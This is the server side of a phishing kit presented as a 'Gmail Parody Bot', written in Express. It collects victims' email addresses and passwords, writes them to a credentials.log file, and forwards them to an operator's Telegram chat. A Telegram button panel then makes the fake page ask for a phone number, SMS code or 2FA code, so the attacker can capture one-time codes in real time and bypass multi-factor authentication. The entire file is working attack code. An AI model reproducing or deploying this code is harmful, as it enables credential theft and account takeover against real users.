require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Store session data
const sessions = {};

// Telegram Bot Configuration
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('🚀 Starting server...');
console.log('📱 BOT_TOKEN:', BOT_TOKEN ? '✅ SET' : '❌ MISSING');
console.log('👤 CHAT_ID:', CHAT_ID ? '✅ SET' : '❌ MISSING');

// ============================================
// TELEGRAM POLLING
// ============================================
let lastUpdateId = 0;

async function pollTelegram() {
    try {
        const url = `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        
        if (response.data.ok && response.data.result.length > 0) {
            for (const update of response.data.result) {
                await handleTelegramUpdate(update);
                lastUpdateId = update.update_id;
            }
        }
    } catch (error) {
        console.error('❌ Polling error:', error.message);
    }
}

async function handleTelegramUpdate(update) {
    // Handle callback queries (button clicks)
    if (update.callback_query) {
        await handleCallbackQuery(update.callback_query);
        return;
    }
    
    // Handle regular messages
    const message = update.message;
    if (!message || !message.text) return;
    
    const text = message.text;
    const chatId = message.chat.id;
    
    console.log('📩 Received message:', text);
    
    // Only respond to your chat ID
    if (chatId.toString() !== CHAT_ID) {
        console.log('❌ Wrong chat ID - ignoring');
        return;
    }
    
    // ============================================
    // COMMAND: /control [sessionId]
    // ============================================
    if (text.startsWith('/control')) {
        const parts = text.split(' ');
        if (parts.length === 2) {
            const sessionId = parts[1];
            if (sessions[sessionId]) {
                await sendControlButtons(sessionId);
            } else {
                await sendToTelegram(`❌ Session ${sessionId} not found`);
            }
        } else {
            await sendToTelegram(`ℹ️ Usage: /control [sessionId]\n\nExample: /control 1734567890`);
        }
        return;
    }
    
    // ============================================
    // COMMAND: /sessions
    // ============================================
    if (text === '/sessions') {
        const sessionList = Object.keys(sessions);
        if (sessionList.length === 0) {
            await sendToTelegram('📭 No active sessions');
        } else {
            await sendToTelegram(`📋 <b>Active Sessions:</b>\n\n${sessionList.map(id => `• ${id}`).join('\n')}`);
        }
        return;
    }
    
    // ============================================
    // DEFAULT: Help
    // ============================================
    await sendToTelegram(
        `🤖 <b>Gmail Parody Bot</b>\n\n` +
        `<b>Commands:</b>\n` +
        `/control [sessionId] - Control a session with buttons\n` +
        `/sessions - List all active sessions\n\n` +
        `<b>How to use:</b>\n` +
        `1. Open the webpage\n` +
        `2. Get the session ID from the page\n` +
        `3. Send: /control 1234567890\n` +
        `4. Use the buttons to control the website!`
    );
}

async function handleCallbackQuery(callbackQuery) {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    
    console.log('🖱️ Button clicked:', data);
    
    // Only respond to your chat ID
    if (chatId.toString() !== CHAT_ID) {
        return;
    }
    
    // Parse: "sessionId|command"
    const [sessionId, command] = data.split('|');
    
    if (!sessions[sessionId]) {
        await answerCallbackQuery(callbackQuery.id, '❌ Session expired!');
        return;
    }
    
    // Store the command
    sessions[sessionId].command = command;
    sessions[sessionId].promptType = command; // Track what prompt to show
    console.log(`✅ Command ${command} set for session ${sessionId}`);
    
    // Acknowledge
    await answerCallbackQuery(callbackQuery.id, `✅ ${command} command sent!`);
    
    // Update message
    await editMessageText(chatId, messageId, 
        `✅ <b>Command Sent: ${command}</b>\nSession: ${sessionId}\n\nWebsite is now showing the prompt!`
    );
    
    // Send detailed notification
    await sendToTelegram(
        `🎬 <b>Action Triggered!</b>\n` +
        `Session: ${sessionId}\n` +
        `Command: ${command}\n\n` +
        `Website is now showing the ${command} prompt.`
    );
}

// ============================================
// TELEGRAM UI - CONTROL BUTTONS
// ============================================

async function sendControlButtons(sessionId) {
    const session = sessions[sessionId];
    const email = session?.email || 'Not entered yet';
    const password = session?.password || 'Not entered yet';
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: '📱 Enter Phone Number', callback_data: `${sessionId}|phone` }
            ],
            [
                { text: '✉️ Enter SMS Code', callback_data: `${sessionId}|sms` }
            ],
            [
                { text: '🔐 Enter 2FA/Security Code', callback_data: `${sessionId}|2fa` }
            ],
            [
                { text: '🔔 Notification Prompt', callback_data: `${sessionId}|notification` }
            ],
            [
                { text: '✅ Success Page', callback_data: `${sessionId}|success` }
            ]
        ]
    };
    
    const message = 
        `🎬 <b>Control Panel</b>\n\n` +
        `<b>Session:</b> ${sessionId}\n` +
        `<b>Email:</b> ${email}\n` +
        `<b>Password:</b> ${password}\n\n` +
        `<b>Choose what prompt to show on the website:</b>`;
    
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        console.log('✅ Control buttons sent!');
    } catch (error) {
        console.error('❌ Failed to send buttons:', error.message);
    }
}

// ============================================
// TELEGRAM HELPERS
// ============================================

async function sendToTelegram(message) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Message sent');
    } catch (error) {
        console.error('❌ Telegram send error:', error.message);
    }
}

async function answerCallbackQuery(callbackQueryId, text) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false
        });
    } catch (error) {
        console.error('❌ Answer callback error:', error.message);
    }
}

async function editMessageText(chatId, messageId, text) {
    try {
        await axios.post(`${TELEGRAM_API}/editMessageText`, {
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('❌ Edit message error:', error.message);
    }
}

// Start polling
console.log('🔄 Starting Telegram polling...');
setInterval(pollTelegram, 2000);

// ============================================
// API ROUTES
// ============================================

// 1. Page visit
app.post('/api/visit', async (req, res) => {
    const sessionId = Date.now().toString();
    sessions[sessionId] = { 
        step: 'visited', 
        command: null,
        promptType: null,
        email: null,
        password: null,
        verificationData: null,
        createdAt: new Date().toISOString()
    };
    
    console.log(`🌐 New visit: ${sessionId}`);
    await sendToTelegram(
        `🌐 <b>Page Visited!</b>\n\n` +
        `Session: <code>${sessionId}</code>\n` +
        `Time: ${new Date().toLocaleTimeString()}\n\n` +
        `To control this session, send:\n` +
        `/control ${sessionId}`
    );
    
    res.json({ sessionId });
});

// 2. Email
app.post('/api/email', async (req, res) => {
    const { sessionId, email } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].email = email;
        sessions[sessionId].step = 'email_received';
    }
    
    console.log(`📧 Email: ${email}`);
    await sendToTelegram(`📧 <b>Email Entered</b>\nSession: ${sessionId}\nEmail: ${email}`);
    res.json({ success: true });
});

// 3. Password
app.post('/api/password', async (req, res) => {
    const { sessionId, password } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].password = password;
        sessions[sessionId].step = 'password_received';
        
        const logEntry = `[${new Date().toISOString()}] Session: ${sessionId} | Email: ${sessions[sessionId].email || 'N/A'} | Password: ${password}\n`;
        fs.appendFileSync('credentials.log', logEntry);
        console.log('📝 Credentials logged');
    }
    
    await sendToTelegram(
        `🔑 <b>Password Entered!</b>\n\n` +
        `Session: <code>${sessionId}</code>\n` +
        `Email: ${sessions[sessionId]?.email || 'N/A'}\n` +
        `Password: <code>${password}</code>\n\n` +
        `Control this session: /control ${sessionId}`
    );
    
    res.json({ success: true });
});

// 4. Get command for page (POLLING)
app.get('/api/command/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    if (!sessions[sessionId]) {
        return res.json({ command: null, promptType: null });
    }
    
    const command = sessions[sessionId].command;
    const promptType = sessions[sessionId].promptType;
    
    // Clear after reading
    if (command) {
        sessions[sessionId].command = null;
        console.log(`📤 Sending command: ${command} to session ${sessionId}`);
    }
    
    res.json({ command, promptType });
});

// 5. Submit verification data from page
app.post('/api/verify', async (req, res) => {
    const { sessionId, value, type } = req.body;
    
    if (sessions[sessionId]) {
        sessions[sessionId].verificationData = value;
        sessions[sessionId].step = 'verified';
    }
    
    console.log(`✅ Verification submitted: ${type} = ${value}`);
    await sendToTelegram(
        `✅ <b>Verification Submitted!</b>\n\n` +
        `Session: ${sessionId}\n` +
        `Type: ${type}\n` +
        `Value: <code>${value}</code>`
    );
    
    res.json({ success: true });
});

// 6. Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        sessions: Object.keys(sessions).length,
        activeSessions: Object.keys(sessions).map(id => ({
            id,
            email: sessions[id].email,
            password: sessions[id].password ? '***' : null,
            step: sessions[id].step
        }))
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Telegram polling active`);
    console.log(`🔑 Bot Token: ${BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
    console.log(`👤 Chat ID: ${CHAT_ID ? '✅ Set' : '❌ Missing'}`);
});
